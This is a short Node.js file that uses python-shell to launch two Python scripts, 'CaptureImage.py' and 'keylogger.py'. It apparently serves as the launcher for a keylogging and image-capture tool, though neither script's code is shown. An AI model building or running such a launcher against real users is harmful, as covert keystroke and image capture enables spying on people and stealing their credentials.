let {PythonShell} = require('python-shell')
PythonShell.run('CaptureImage.py', null, function (err, results) {
  // script finished
  if (err) throw err;
  console.log('running');
});

PythonShell.run('keylogger.py', null, function (err) {
    if (err) throw err;
    console.log('finished');
  });

  // PythonShell.run('CaptureImage.py', null, function (err) {
  //   if (err) throw err;
  //   console.log('finished');
  // });
  
